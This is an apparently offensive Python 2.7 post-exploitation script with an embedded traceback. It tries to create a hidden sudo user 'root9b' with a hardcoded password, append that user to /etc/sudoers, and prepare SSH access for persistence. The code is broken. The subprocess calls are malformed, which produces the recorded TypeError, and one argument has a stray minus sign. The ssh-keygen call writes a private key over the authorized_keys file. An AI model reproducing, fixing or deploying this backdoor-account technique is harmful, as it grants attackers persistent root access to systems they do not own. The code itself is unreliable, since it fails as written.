#/usr/bin/python2.7
# PURPOSE: this script quickly adds a sudoer to the system and ensures the
# user has ssh access. Wave good-bye to non interactive shells

#ERROR ENCOUNTERED:
error='''
~/g/Offensive_Python ❯❯❯ sudo python add_sudo_ssh_user.py 
Traceback (most recent call last):
  File "add_sudo_ssh_user.py", line 25, in <module>
    addsudoer()
  File "add_sudo_ssh_user.py", line 14, in addsudoer
    '-s', '/bin/bash')          # set shell to bash
  File "/usr/lib/python2.7/subprocess.py", line 212, in check_output
    process = Popen(stdout=PIPE, *popenargs, **kwargs)
TypeError: __init__() got multiple values for keyword argument 'stdout'  
'''
###


import subprocess


def addsudoer():
    subprocess.check_output('/usr/sbin/useradd', '-m',  # create home dir (for .ssh folder)
                            '-G', 'sudo',               # group
                            '-p', '9btoor',             # pass
                            'root9b',                   # user
                            '-s', '/bin/bash')          # set shell to bash
    subprocess.check_output('echo', '\"root9b    ALL=(ALL:ALL) ALL\"', ' >> ', '/etc/sudoers')  # just in case


def add_sshuser():
    subprocess.check_output('mkdir','/home/root9b/.ssh')
    subprocess.check_output('chmod', '700','/home/root9b/.ssh')
    subprocess.check_output('touch', '/home/root9b/.ssh/authorized_keys')
    subprocess.check_output('ssh-keygen','-t','rsa', '-f','/home/root9b/.ssh/authorized_keys', -'N',"\'\'")


addsudoer()
add_sshuser()
print 'done'


